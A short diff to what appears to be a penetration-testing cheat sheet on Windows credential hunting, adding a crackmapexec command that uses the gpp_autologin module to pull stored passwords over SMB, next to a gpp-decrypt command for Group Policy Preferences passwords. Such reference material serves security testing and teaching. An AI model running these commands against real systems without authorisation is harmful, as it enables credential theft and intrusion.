@@ -1154,6 +1154,12 @@ Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents 
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
+Using crackmapexec to get the passwords:
+
+```shell-session
+crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
+```
+
 ### IIS Web Config
 
 ```bash
